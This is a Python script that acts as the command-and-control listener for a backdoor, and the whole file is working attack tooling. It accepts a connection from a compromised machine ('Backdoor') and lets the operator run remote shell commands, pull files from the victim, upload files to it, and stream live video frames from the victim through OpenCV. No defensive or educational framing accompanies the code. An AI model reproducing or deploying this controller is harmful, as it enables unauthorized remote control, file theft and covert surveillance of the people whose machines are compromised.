#!/usr/bin/env python
import socket 
import os
import sys
import base64
import argparse
import time
import Banner
import cv2
import numpy as np
import time

class StageLisner:
    def __init__(self):
        Banner.Banner() 
        self.C2Control()
        self.LisnerData()
    def LisnerData(self):

        CallBackSocket= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        CallBackSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        Server = '0.0.0.0'
        Port= self.args.Port
        CallBackSocket.bind((Server,Port))
        CallBackSocket.listen()
        Backdoor , IPaddres = CallBackSocket.accept()
        Info = str(IPaddres).replace('(','').replace(')','').replace("'",'').split(',')
        print('Connect To IP [ '+f'{Info[0]}'+' ]'+' In Port [ '+f'{Info[1]}'+' ]',end='\n')
       
        while True:  
            try: 
                try:
                    Backdoor.settimeout(5)
                    Data = str(Backdoor.recv(4096).decode('latin-1'))
                    print(Data,end='', flush=True)
                except TimeoutError:
                        Backdoor.sendall('\n'.encode(('latin-1')))    
                InPutCommand = input()
                if InPutCommand == None :
                    Backdoor.sendall('\n'.encode(('latin-1')))
                elif 'quit' in InPutCommand:
                      Backdoor.sendall(InPutCommand.encode(('latin-1'))) 
                      exit()   
                elif 'gitfile' in InPutCommand :
                    Backdoor.sendall(InPutCommand.encode(('latin-1')))              
                    LenDataFile =  Backdoor.recv(4)
                    LenDataFile = int.from_bytes(LenDataFile, byteorder='big')
                    FileDataGet = b''
                    while len(FileDataGet) < LenDataFile:
                        BytesBlock =  Backdoor.recv(LenDataFile - len(FileDataGet))
                        if not BytesBlock:
                            break
                        FileDataGet += BytesBlock
                    with open(InPutCommand.split()[-1], 'wb') as file:
                        file.write(FileDataGet)
                elif 'loadfile' in InPutCommand :
                    try:
                        Backdoor.sendall(InPutCommand.encode(('latin-1')))
                        with open(InPutCommand.split()[-1],'rb') as FiLEUp:
                            FiLEUp = FiLEUp.read()     
                            Backdoor.send(len(FiLEUp).to_bytes(4, byteorder='big'))
                            Backdoor.sendall(FiLEUp) 
                    except FileNotFoundError:
                        Backdoor.sendall('\n'.encode(('latin-1')))
                        print(str(Data)+InPutCommand.split()[-1],' No such file or directory\n',end='', flush=True)
                elif 'stream' in InPutCommand:
                    def receive_frames():
                        Backdoor.sendall(InPutCommand.encode(('latin-1')))
                        Backdoor.sendall('\n'.encode(('latin-1')))
                        print(Data,end='', flush=True)
                        try:
                            while True:
                                frame_length = Backdoor.recv(16)
                                if not frame_length:
                                    break    
                                frame_length = int(frame_length.strip())
                                frame_data = b''
                                while len(frame_data) < frame_length:
                                    remaining_length = frame_length - len(frame_data)
                                    frame_data += Backdoor.recv(remaining_length)
                                frame_array = np.frombuffer(frame_data, dtype=np.uint8)
                                frame = cv2.imdecode(frame_array, cv2.IMREAD_COLOR)
                                cv2.imshow('Received Frame', frame)
                                if cv2.waitKey(1) & 0xFF == ord('q'):
                                    break
                        finally:
                            cv2.destroyAllWindows()        
                    receive_frames()
                else:  
                    Backdoor.sendall(bytes(InPutCommand.encode(('latin-1'))))
                    Data = str(Backdoor.recv(4096).decode('latin-1'))
                    print(Data,end='', flush=True)

            except TimeoutError : 
               Backdoor.sendall('\n'.encode(('latin-1')))
    def C2Control(self): 
        parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]")             
        parser.add_argument("-P","--Port" , action=None ,required=False,help ="url Targst web",type=int) 
        self.args = parser.parse_args()     
        if len(sys.argv)!=1 :
            pass
        else:
            parser.print_help()         
            exit()  
if __name__=='__main__':
        StageLisner()
